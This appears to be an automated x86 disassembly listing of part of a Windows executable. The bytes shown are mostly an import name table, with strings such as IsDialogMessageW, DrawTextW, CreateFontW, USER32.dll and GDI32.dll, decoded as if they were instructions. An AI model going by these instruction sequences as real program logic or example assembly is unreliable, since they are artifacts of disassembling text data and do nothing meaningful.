  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
